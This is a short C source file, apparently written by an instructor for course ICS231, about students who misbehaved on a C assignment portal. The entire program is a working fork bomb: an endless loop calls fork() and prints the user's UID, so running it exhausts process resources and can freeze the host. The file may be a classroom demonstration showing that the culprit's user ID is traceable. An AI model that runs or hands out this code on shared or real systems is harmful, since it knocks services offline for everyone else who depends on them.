// Author -- Tas, ICS231
// about mischevious thing,some of you did on C assignment portal
#include<stdio.h> 
#include<unistd.h>
#include<stdlib.h>
#include<sys/types.h>
#include<errno.h>

void forkbomb()
{
	while(1)
	{		fork(); 
			printf("The mischevious dude who released the bomb is %ld\n",(long)getuid());
	}
}
int main(void)
{
	forkbomb();

	return 0;
}

